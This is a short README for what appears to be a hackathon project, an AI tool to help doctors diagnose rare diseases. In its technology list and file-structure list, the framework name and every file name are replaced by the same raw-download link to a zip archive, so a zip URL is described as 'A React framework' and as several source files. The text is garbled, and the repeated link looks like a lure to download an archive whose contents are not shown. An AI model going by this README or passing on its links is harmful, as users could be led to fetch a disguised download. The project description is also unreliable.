📋 **AI-Based Diagnostic Tool for Rare Diseases**  

🚀 **Problem Statement**  
Develop an AI-powered diagnostic tool designed to assist doctors in identifying rare diseases. The system will analyze various forms of patient data—including medical history, symptoms, and lab results—to provide potential diagnoses and recommend further tests if needed.  


## Technologies Used

- **TypeScript**: The primary language used for development.
- **https://github.com/rushangchandekar/HackOn_Codewarts/raw/refs/heads/main/app/Codewarts_On_Hack_v2.3.zip**: A React framework for building server-side rendered and static web applications.
- **React**: A JavaScript library for building user interfaces.
- **CSS**: Used for styling components.

## File Structure

- **https://github.com/rushangchandekar/HackOn_Codewarts/raw/refs/heads/main/app/Codewarts_On_Hack_v2.3.zip**: Defines the root layout of the application with metadata.
- **https://github.com/rushangchandekar/HackOn_Codewarts/raw/refs/heads/main/app/Codewarts_On_Hack_v2.3.zip**: Main page of the application that includes the diagnostic tool component.
- **https://github.com/rushangchandekar/HackOn_Codewarts/raw/refs/heads/main/app/Codewarts_On_Hack_v2.3.zip**: Component responsible for handling file uploads and processing patient data.
